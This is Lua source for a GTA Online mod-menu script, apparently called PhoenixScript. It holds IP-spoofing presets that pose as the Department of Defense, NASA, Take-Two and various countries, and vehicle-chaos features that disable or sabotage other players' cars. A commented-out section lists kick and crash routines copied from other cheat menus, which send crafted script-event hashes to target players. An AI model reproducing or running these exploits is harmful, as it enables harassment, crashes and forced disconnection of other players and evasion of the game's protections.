	menu.action(spoofpresets, "Enable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip on")
	end)

	menu.action(spoofpresets, "Disable IP Spoofer", {}, "", function()
		menu.trigger_commands("spoofip off")
	end)

	menu.divider(spoofpresets, "Fun IP Presets")

	menu.action(spoofpresets, "Computer Problem Solving (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.146." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "US Department of Defense", {}, "", function()
		menu.trigger_commands("spoofedip " .. "155.21." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "NASA (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.169." .. tostring(math.random(48, 123)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Apple (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "17.234." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Akamai (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "23.66." .. tostring(math.random(16, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "40.89." .. tostring(math.random(224, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Microsoft (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.144." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	t2spoofpresets = menu.list(spoofpresets, "Take-Two", {}, "", function(); end)
	
	menu.action(t2spoofpresets, "Take-Two (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.227." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (US)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "192.81." .. tostring(math.random(240, 244)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138." .. tostring(math.random(231, 232)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (AU)", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "139.138.226." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "139.138.244." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(t2spoofpresets, "Take-Two (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.233." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (ES)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.247." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.236." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CZ)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.237." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (IN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.224." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (SG)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.228." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.229." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (CN)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.230." .. tostring(math.random(0, 255)))
	end)

	menu.action(t2spoofpresets, "Take-Two (HK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.138.238." .. tostring(math.random(0, 255)))
	end)

	menu.divider(spoofpresets, "VPN IP Presets")

	octospoofpresets = menu.list(spoofpresets, "OVH", {}, "", function(); end)

	menu.action(octospoofpresets, "OVH (AU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.99." .. tostring(math.random(232, 234)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(octospoofpresets, "OVH (DE)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "145.239.235." .. tostring(math.random(40, 111)))
	end)

	menu.action(octospoofpresets, "OVH (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.89.208." .. tostring(math.random(88, 95)))
	end)

	menu.action(octospoofpresets, "OVH (US)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "51.81.119." .. tostring(math.random(0, 15)))
	end)

	menu.action(octospoofpresets, "OVH (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "192.99.250." .. tostring(math.random(208, 223)))
	end)

	tempestpresets = menu.list(spoofpresets, "Tempest Hosting", {}, "", function(); end)

	menu.action(tempestpresets, "Tempest Hosting (US-NY)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (US-CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.252." .. tostring(math.random(0, 127)))
	end)
	
	menu.action(tempestpresets, "Tempest Hosting (US-FL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (CA)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(128, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (NL)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (UK)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.255." .. tostring(math.random(0, 127)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (RU)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.253." .. tostring(math.random(127, 255)))
	end)

	menu.action(tempestpresets, "Tempest Hosting (JP)", {}, "", function()
		menu.trigger_commands("spoofedip " .. "142.252.254." .. tostring(math.random(0, 127)))
	end)

	menu.divider(spoofpresets, "Residential IP Presets")

	menu.action(spoofpresets, "Russia", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "109.252." .. tostring(math.random(40, 45)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "92.100." .. tostring(math.random(178, 182)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217.107." .. tostring(math.random(82, 98)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "95.24." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "China", {}, "", function()
		menu.trigger_commands("spoofedip " .. "42.123." .. tostring(math.random(0, 31)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Australia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "139.168." .. tostring(math.random(40, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Chicago", {}, "", function()
		menu.trigger_commands("spoofedip " .. "73.110." .. tostring(math.random(149, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Baltimore", {}, "", function()
		menu.trigger_commands("spoofedip " .. "69.67." .. tostring(math.random(80, 95)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "USA Texas", {}, "AT&T / IBM", function()
		menu.trigger_commands("spoofedip " .. "198.81.193." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Germany", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "84.56." .. tostring(math.random(218, 231)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "46.223." .. tostring(math.random(234, 251)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "93." .. tostring(math.random(192, 255)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "89.14." .. tostring(math.random(120, 124)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Italy", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "5.89." .. tostring(math.random(190, 197)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.200." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Netherlands", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "217.123." .. tostring(math.random(124, 125)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(100, 105)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "139.156." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "94.212." .. tostring(math.random(40, 47)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "France", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.10." .. tostring(math.random(134, 151)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "United Kingdom", {}, "", function()
		sel = math.random(1,4)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "81.109." .. tostring(math.random(120, 130)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "217.33." .. tostring(math.random(88, 90)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "2.217." .. tostring(math.random(20, 30)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 4 then
			menu.trigger_commands("spoofedip " .. "86.0." .. tostring(math.random(54, 60)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Ireland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.203." .. tostring(math.random(0, 10)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Switzerland", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "85.0." .. tostring(math.random(41, 43)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "84.73." .. tostring(math.random(0, 115)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Austria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "194.166." .. tostring(math.random(250, 252)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Denmark", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "83.92." .. tostring(math.random(121, 124)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "87.104." .. tostring(math.random(64, 127)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Belgium", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.111." .. tostring(math.random(2, 4)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Spain", {}, "", function()
		menu.trigger_commands("spoofedip " .. "93.176." .. tostring(math.random(154, 155)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Portugal", {}, "", function()
		menu.trigger_commands("spoofedip " .. "94.61." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Norway", {}, "", function()
		menu.trigger_commands("spoofedip " .. "80.213." .. tostring(math.random(174, 181)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Finland", {}, "", function()
		menu.trigger_commands("spoofedip " .. "88.113." .. tostring(math.random(64, 83)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Sweden", {}, "", function()
		sel = math.random(1,2)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "78.72." .. tostring(math.random(240, 245)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "151.252." .. tostring(math.random(128, 172)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Slovakia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.64." .. tostring(math.random(50, 55)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Romania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.117." .. tostring(math.random(0, 127)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Poland", {}, "", function()
		sel = math.random(1,3)
		if sel == 1 then
			menu.trigger_commands("spoofedip " .. "178.36." .. tostring(math.random(221, 229)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 2 then
			menu.trigger_commands("spoofedip " .. "193.17." .. tostring(math.random(174, 174)) .. "." .. tostring(math.random(0, 255)))
		elseif sel == 3 then
			menu.trigger_commands("spoofedip " .. "217." .. tostring(math.random(96, 99)) .. "." .. tostring(math.random(0, 255)) .. "." .. tostring(math.random(0, 255)))
		end
	end)

	menu.action(spoofpresets, "Czech Republic", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.91." .. tostring(math.random(164, 166)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Bulgaria", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.154." .. tostring(math.random(162, 164)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Slovenia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "77.111." .. tostring(math.random(53, 53)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Croatia", {}, "", function()
		menu.trigger_commands("spoofedip " .. "185.133." .. tostring(math.random(132, 135)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Albania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "79.106." .. tostring(math.random(160, 191)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Lithuania", {}, "", function()
		menu.trigger_commands("spoofedip " .. "90.140." .. tostring(math.random(13, 13)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Hungary", {}, "", function()
		menu.trigger_commands("spoofedip " .. "84.2." .. tostring(math.random(137, 137)) .. "." .. tostring(math.random(0, 255)))
	end)

	menu.action(spoofpresets, "Greece", {}, "", function()
		menu.trigger_commands("spoofedip " .. "2.85." .. tostring(math.random(227, 227)) .. "." .. tostring(math.random(0, 255)))
	end)

	vehchaos = menu.list(menu.my_root(), "Vehicle Chaos", {}, "", function(); end)
	menu.divider(vehchaos, "Chaos mode")

	menu.toggle(vehchaos, "Enable", {"vehchaos"}, "", function(on)
		if on then
			chaos = true
		else
			chaos = false
		end
	end, false)

	menu.toggle(vehchaos, "Gravity", {"vehchaosgrav"}, "", function(on)
		if on then
			gravity = true
		else
			gravity = false
		end
	end, true)

	menu.click_slider(vehchaos, "Power", {"vehchaospower"}, "", 30, 300, 100, 10, function(s)
	speed = s
	end)


	menu.divider(vehchaos, "Oppressor blacklisting")
	kick_players = true
	menu.toggle(vehchaos, "On", {"antioppressor"}, "Automatically kicks players off oppressor mkii's", function(on)
		if on then
			kick_players = true
		else
			kick_players = false
		end
	end, false)

	lock_vehicle = true
	menu.toggle(vehchaos, "Lock vehicle", {"lockmk2"}, "Permanently locks the vehicle to prevent further use", function(on)
		if on then
			lock_vehicle = true
		else
			lock_vehicle = false
		end
	end, false)

	target_self = false
	menu.toggle(vehchaos, "Target self", {"targetselfmk2"}, "Targets your mk2's as well (this is stupid)", function(on)
		if on then
			target_self = true
		else
			target_self = false
		end
	end, false)

	target_friends = false
	menu.toggle(vehchaos, "Target friends", {"targetfriendsmk2"}, "Targets your friends' mk2's as well", function(on)
		if on then
			target_friends = true
		else
			target_friends = false
		end
	end, false)

	menu.divider(vehchaos, "Other Shit")

	menu.action(vehchaos, "Remove Wheels", {"removewheels"}, "removes your wheels and has various side effects depending on the vehicle", function()
		notification("removing wheels...", false, true)
		local veh = util.get_vehicle()
		if veh ~= 0 then
			native_invoker.begin_call()
			native_invoker.push_arg_int(veh)
			native_invoker.push_arg_float(3.402823466e+38)
			native_invoker.end_call("93A3996368C94158") -- VEHICLE.MODIFY_VEHICLE_TOP_SPEED
		end
	end)	


	menu.action(vehchaos,"Make all Cars Drive Backwards", {"backwards"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(util.get_all_vehicles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.MODIFY_VEHICLE_TOP_SPEED(ent, -2147483647)
		end)
	end)

	menu.action(vehchaos,"Kill all Engines", {"killall"}, "",function()
		local local_veh = get_player_veh(PLAYER.PLAYER_ID(),false)
		for_table_do(util.get_all_vehicles(),true,function(ent) 
			if ent == local_veh then return end
			VEHICLE.SET_VEHICLE_ENGINE_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_BODY_HEALTH(ent, -4000)
			VEHICLE.SET_VEHICLE_PETROL_TANK_HEALTH(ent, -4000)
		end)
	end)

	menu.toggle(vehchaos,"Spinbot Vehicles", {"spinbot"}, "speeeeen",function(bop)
		spinbot_vehicles = bop

	
	
	end)


end






function update_join(pid)
	cmd_id[pid] = menu.toggle(custselc, tostring(PLAYER.GET_PLAYER_NAME(pid)), {}, "PID - ".. pid, function(on_toggle)
		if on_toggle then
			selectedplayer[pid] = true
		else
			selectedplayer[pid] = false
		end
	end)
end

function update_leave(pid)
	menu.delete(cmd_id[pid])
end

function delet_entity(entity)
	entitypointer = memory.alloc(24)
	memory.write_int(entitypointer, entity)
	bool = ENTITY.DELETE_ENTITY(entitypointer)
	memory.free(entitypointer)
	return bool
end

table_cage = {attach}
table_ladder = {attach}
table_entity = {attach}
table_gravity = {attach}
table_kidnap = {veh_to_attach}
veh_attach = {attach}
table_veh = {"adder", "buzzard", "cargobob", "dinghy", "banshee", "frogger", "zentorno"}
table_ped = {"a_c_boar", "a_c_deer", "a_c_chop", "a_c_chimp", "a_c_cow", "a_c_mtlion", "a_c_rabbit_01", "a_c_husky"}

function cleanup()
--[[for n = 1, #table_entity do
		delet_entity(table_entity[n])
	end
	for n = 1, #table_gravity do
		delet_entity(table_gravity[n])
	end]]
	for n = 1, #table_ladder do
		delet_entity(table_ladder[n])
	end
	for n = 1, #veh_attach do
		delet_entity(veh_attach[n])
	end
end

local crash_in_progress = false

GenerateFeatures = function(pid)
	cage = util.joaat("prop_gascage01")	
	ladder = 1888301071
	ground = -1951226014
	attach = 1
	veh_to_attach = 1

	function v3_2(x, y, z)
        if x == nil then
            x = 0
        end
        if y == nil then
            y = 0
        end
        if z == nil then
            z = 0
        end
    end

	function attach_vehicle(model_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local veh_hash = util.joaat(model_name)
		if STREAMING.IS_MODEL_A_VEHICLE(veh_hash) then
			STREAMING.REQUEST_MODEL(veh_hash)
			while not STREAMING.HAS_MODEL_LOADED(veh_hash) do
				util.yield()
			end
			veh_attach[attach] = util.create_vehicle(veh_hash, ENTITY.GET_ENTITY_COORDS(V3, true),
									 CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
			ENTITY.ATTACH_ENTITY_TO_ENTITY(veh_attach[attach], V3, 0, 0, 0, 0, math.random(0, 180), 0, math.random(0, 180), false, true, false, false, 0, false)
			-- void ATTACH_ENTITY_TO_ENTITY(entity1, entity2, boneIndex, float xPos, float yPos, float zPos, float xRot, float yRot, float zRot, BOOL p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
			ENTITY.SET_ENTITY_VISIBLE(veh_attach[attach], true)
			ENTITY.SET_ENTITY_INVINCIBLE(veh_attach[attach], true)
			attach = attach + 1
			notification("Attached [" .. model_name .. "] to " .. PLAYER.GET_PLAYER_NAME(pid), true, false)
		end
	end

	function spawn_ped(ped_name, pid)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-2, 2)
        coords_ped.y = coords_ped.y + math.random(-2, 2)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, false)
		notification("Spawned [" .. ped_name .. "] on " .. PLAYER.GET_PLAYER_NAME(pid), true, false)
		--util.yield(15000)
		--delet_entity(ped)
		--notification("Deleted [" .. ped_name .. "]", true, false)
	end

	function attach_vehicle_to_ped(model_name, ped_name, pid, repeats)
		local V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local ped_hash = util.joaat(ped_name)	
		STREAMING.REQUEST_MODEL(ped_hash)
		while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
			util.yield()
		end
	
		aab = v3()
        aab = ENTITY.GET_ENTITY_COORDS(V3, true)
	
		local ped = util.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)

		coords_ped = v3()
        coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)
        coords_ped.x = coords_ped.x + math.random(-5, 5)
        coords_ped.y = coords_ped.y + math.random(-5, 5)
        coords_ped.z = coords_ped.z

        ENTITY.SET_ENTITY_COORDS(ped, coords_ped.x, coords_ped.y, coords_ped.z, false, false, false, false)
		ENTITY.SET_ENTITY_VISIBLE(ped, true)
		for r = 1, repeats do
			for i = 1, #model_name do
				local veh_hash = util.joaat(model_name[i])
				if STREAMING.IS_MODEL_A_VEHICLE(veh_hash) then
					STREAMING.REQUEST_MODEL(veh_hash)
					while not STREAMING.HAS_MODEL_LOADED(veh_hash) do
						util.yield()
					end
					veh_attach[attach] = util.create_vehicle(veh_hash, ENTITY.GET_ENTITY_COORDS(V3, true), CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
					ENTITY.ATTACH_ENTITY_TO_ENTITY(veh_attach[attach], ped, 0, 0, 0, 0, math.random(0, 180), 0, math.random(0, 180), false, true, false, false, 0, false)
					-- void ATTACH_ENTITY_TO_ENTITY(entity1, entity2, boneIndex, float xPos, float yPos, float zPos, float xRot, float yRot, float zRot, BOOL p9, useSoftPinning, collision, isPed, vertexIndex, fixedRot)
					ENTITY.SET_ENTITY_VISIBLE(veh_attach[attach], true)
					ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
					ENTITY.SET_ENTITY_INVINCIBLE(veh_attach[attach], true)
					attach = attach + 1
					notification("Spawned [" .. ped_name .. "] on [" .. coords_ped.x .. "] [".. coords_ped.y .. "] [".. coords_ped.z .. "] and attached [" .. model_name[i] .. "]", true, false)
				end
			end
		end
		util.yield(250)
		delet_entity(ped)
	end
	
	function attach_ladder(hash, xPos, zPos, yPos, xRot, yRot, zRot, visible, pid)
		while not STREAMING.HAS_MODEL_LOADED(hash) do
			STREAMING.REQUEST_MODEL(hash)
			util.yield()
		end
	
		playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		table_ladder[attach] = OBJECT.CREATE_OBJECT(hash, 1.55, 3.35, 0, true, true)
	
		ENTITY.ATTACH_ENTITY_TO_ENTITY(table_ladder[attach], playerped3, 0, xPos, zPos, yPos, xRot, zRot, yRot, false,
			true, true, false, 0, false)
		ENTITY.SET_ENTITY_VISIBLE(table_ladder[attach], visible)
	
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
		attach = attach + 1
	end

	function send_cage(hash, xPos, zPos, yPos, xRot, yRot, zRot, visible, pid)
		while not STREAMING.HAS_MODEL_LOADED(hash) do
			STREAMING.REQUEST_MODEL(hash)
			util.yield()
		end
	
		playerped3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		table_cage[attach] = OBJECT.CREATE_OBJECT(hash, 1.55, 3.35, 0, true, true)
	
		ENTITY.ATTACH_ENTITY_TO_ENTITY(table_ladder[attach], playerped3, 0, xPos, zPos, yPos, xRot, zRot, yRot, false,
			true, true, false, 0, false)
		ENTITY.SET_ENTITY_VISIBLE(table_ladder[attach], visible)
	
		STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
		attach = attach + 1
	end



	dvdr = menu.divider(menu.player_root(pid), "PhoenixScript")
	main = menu.list(menu.player_root(pid), "PhoenixScript", {}, "", function(); end)

	--selcplyr = menu.list(main, tostring(PLAYER.GET_PLAYER_NAME(pid)), {}, "", function(); end)
	--[[randplyr = menu.list(custselc, "Random Player", {}, "", function(); end)


	menu.divider(randplyr, "Random Player")

	menu.action(randplyr, "Kick", {"kickrandom"}, "", function()
		pids = math.random(0, 32)
		while pids == players.user() or not players.exists(pids) do
			pids = math.random(0, 32)
		end
		if pids ~= players.user() then
			if players.user() == players.get_host() then
				notification("Host Kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
				menu.trigger_commands("hostkick " .. PLAYER.GET_PLAYER_NAME(pids)) -- love that every stands feature can be called using commands ez
			else
				KickV1(pids, 2)
				KickV1(pids, 2)
				notification("Kick V1 & V2 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
			end
		end
	end)

	menu.action(randplyr, "Crash", {"crashrandom"}, "", function()
		pids = math.random(0, 32)
		while pids == players.user() or not players.exists(pids) do
			pids = math.random(0, 32)
		end
		if pids ~= players.user() then
			Crash(pids)
			notification("SE Crash 3 has been sent to " .. PLAYER.GET_PLAYER_NAME(pids), true, false)
		end
	end)]]


	--kickver = menu.list(kickevents, "Kick", {}, "", function(); end)


	--[[kickv11 = menu.list(kickevents, "Stolen kicks", {}, "", function(); end)

	menu.action(kickv11,"Ozark's kick (broken)", {}, "", function() -- ozark kick (not sure is it real owzerk kick or not cuz i didnt log it myself lol)
		if pid ~= players.user() and players.exists(pid) then
			for i = 1, 60 do
				local hash_ozark = ozark_kick[math.random(1, #ozark_kick)]
				send_script_event(hash_ozark, pid, {pid, -26800537, -66094971, -21482748, -13000488, 59643555, hash_ozark, 91870118, -3283691})
			end
			notification("Ozark's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)

	menu.action(kickv11,"Phantom X's kick (broken)", {}, "", function() -- phantomx kick
		if pid ~= players.user() and players.exists(pid) then -- huge kick lol
			local phantomx_kicks = {
				-1559754940,
				-2033338628,
				-1243454584,
				-442306200,
				1352706024,
				-1252906024,
				1317868303,
				-1990292823,
				-1890951223,
				1428412924,
				-1246838892,
				-1212832151,
				830707189,
				1119498954,
				-1729804184,
				-891346918,
				-920663435,
				-1924332863,
				-1549630786,
				1998625272,
				1977655521,
				-1054826273,
				620255745,
				2017765964,
				1974064500,
				-966559987,
				1070934291,
				-345371965,
				-2042143896,
				1922258436,
				495824472,
				1159655011,
				-2017629233,
				-435067392,
				1347850743,
				-1648921703,
				-1333236192
			}
			for i = 1, 60 do
				local hash_phantomx = phantomx_kicks[math.random(1, #phantomx_kicks)]
				send_script_event(hash_phantomx, pid, {pid, -26800537, math.random(-147264233, 194938483), -13000488, 59643555, hash_phantomx, 91870118, -3283691})
			end
			notification("Phantom X's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)

	menu.action(kickv11,"Nightfall's kick (broken)", {}, "", function() -- nightfall kick
		if pid ~= players.user() and players.exists(pid) then -- p kick 3 events nice (last 3 events here are taken off from xf kick cuz nf kick doesnt even work here lol p hack)
			local nightfall_kicks = {
				-1329008922,
				1841943281,
				-435067392,
				-1252906024,
				-442306200,
				-1559754940
			}
			for i = 1, 15 do
				local hash_nightfall = nightfall_kicks[math.random(1, #nightfall_kicks)]
				send_script_event(hash_nightfall, pid, {pid, -26800537, math.random(-147264233, 194938483), 59643555, hash_nightfall, 91870118, -3283691})
				local hash_ozark = ozark_kick[math.random(1, #ozark_kick)] -- nightfall kick doesnt work here idk why so lets just send ozark kick instead
				send_script_event(hash_ozark, pid, {pid, -26800537, -66094971, -21482748, -24450684, -13000488, 59643555, hash_ozark, 91870118, -3283691})
			end
			notification("Nightfall's kick has been sent to " .. PLAYER.GET_PLAYER_NAME(pid), true, true)
		end
	end)

	menu.action(kickv11,"Cherax's kick (broken)", {}, "", function() -- cherax kick
		if pid ~= players.user() and players.exists(pid) then -- lol
			local cherax_kicks = {
				699592812,
				1922258436,
				1881968783,
				-1252906024,
				-1559754940,
				-966559987,
				-442306200,
				1352706024,
				-435067392,
				733106126,
				-1890951223,
				1317868303,
				-1329008922,
